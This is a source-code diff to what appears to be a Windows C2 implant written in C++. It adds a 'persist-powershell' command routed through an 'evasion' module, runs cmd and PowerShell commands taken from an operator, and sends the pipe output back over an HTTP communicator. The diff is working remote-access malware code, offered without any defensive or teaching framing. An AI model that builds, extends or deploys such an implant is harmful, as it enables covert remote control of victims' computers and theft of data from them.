@@ -19,6 +19,7 @@
 
 core* core::instance = NULL;
 bool core::terminated = false;
+PROCESS_INFO* core::persistent_process = NULL;
 int core::sleepTime = 5;
 std::string core::currentPath = "C:\\";
 
@@ -100,6 +101,13 @@ void core::execute_command(std::string cmd){
 		this->execute_powerpick(cmd);
 	}
 
+	if (cmd.rfind("persist-powershell ", 0) == 0) {
+		cmd = cmd.substr(19, cmd.size() - 19);
+		std::string tempCmd(cmd);
+		tempCmd += "\n";
+		evasion::send_command(tempCmd.c_str(), core::persistent_process->stdIn);
+	}
+
 	if (cmd == "exit") {
 		core::terminated = true;
 	}
@@ -114,13 +122,13 @@ void core::execute_cmd(std::string cmd) {
 	wcscpy_s(genericFullCommand, wideFullCommand.size()+1, wideFullCommand.c_str());
 	PROCESS_INFO* info = process::create_process(genericFullCommand);
 	// to read from pipe
-	if (info->stdOutRd) {
-		this->read_pipe(info->stdOutRd);
+	if (info->stdOut) {
+		this->read_pipe(info->stdOut);
 	}
 }
 
 void core::execute_powershell(std::string cmd) {
-	std::string fullCommand = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cd " + core::currentPath + ";" + cmd;
+	std::string fullCommand = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe /nologo cd " + core::currentPath + ";" + cmd;
 
 	// we need wide chars for our process creation function
 	std::wstring wideFullCommand = std::wstring(fullCommand.begin(), fullCommand.end());
@@ -130,8 +138,8 @@ void core::execute_powershell(std::string cmd) {
 	PROCESS_INFO* info = process::create_process(genericFullCommand);
 	// to read from pipe
 
-	if (info && info->stdOutRd) {
-		this->read_pipe(info->stdOutRd);
+	if (info && info->stdOut) {
+		this->read_pipe(info->stdOut);
 	}
 
 }
@@ -150,6 +158,11 @@ void core::read_pipe(HANDLE rdPipe) {
 	BOOL bSuccess = FALSE;
 	std::string completeResult = "";
 
+	DWORD avail;
+	BOOL tSuccess = PeekNamedPipe(rdPipe, NULL, 0, NULL, &avail, NULL);
+
+	if (!tSuccess || avail == 0)
+		return;
 
 	for (;;)
 	{
@@ -173,4 +186,34 @@ void core::read_pipe(HANDLE rdPipe) {
 	// we will assume HTTP always for now
 	if(HttpCommunicator::communicator)
 		HttpCommunicator::communicator->send_output(completeResult);
+}
+
+void core::read_pipe_once(HANDLE rdPipe) {
+	DWORD dwRead;
+	BYTE chBuf[BUFSIZE];
+	BOOL bSuccess = FALSE;
+	std::string completeResult = "";
+
+	DWORD avail;
+	BOOL tSuccess = PeekNamedPipe(rdPipe, NULL, 0, NULL, &avail, NULL);
+
+	if (!tSuccess || avail == 0)
+		return;
+
+	bSuccess = ReadFile(rdPipe, chBuf, BUFSIZE, &dwRead, NULL);
+
+	char str[(sizeof chBuf) + 1];
+	memcpy(str, chBuf, sizeof chBuf);
+	str[sizeof chBuf] = 0; // Null termination.
+
+	std::string tempResult(str);
+	completeResult += tempResult;
+
+	if (completeResult != "") {
+		completeResult.erase(remove_if(completeResult.begin(), completeResult.end(), core::invalid_char), completeResult.end());
+
+		// we will assume HTTP always for now
+		if (HttpCommunicator::communicator)
+			HttpCommunicator::communicator->send_output(completeResult);
+	}
 }
